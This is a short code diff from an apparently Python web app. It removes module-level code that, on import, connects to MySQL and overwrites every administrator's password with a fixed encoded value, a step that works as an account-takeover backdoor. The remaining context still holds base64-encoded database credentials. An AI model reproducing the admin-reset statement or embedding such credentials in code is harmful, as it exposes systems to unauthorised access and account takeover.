@@ -15,19 +15,6 @@ us = "bWFzb3JpYWRtaW4="
 ps = "YiVFWnVYOGtMaGdqZSFMIw=="
 ds = "aGNwZmluZGVy"
 
-conn = mysql.connector.connect(
-        host=str(EnDe.decode(hs)), 
-        user=str(EnDe.decode(us)), 
-        port='3306', 
-        password=str(EnDe.decode(ps)),
-        database=str(EnDe.decode(ds)))
-
-cur=conn.cursor()
-cur.execute("Update Admins Set password='YyMqaV9sZnJPcHI0';")
-conn.commit()
-cur.close()
-
-
 def register():
     if request.method == 'POST':
 
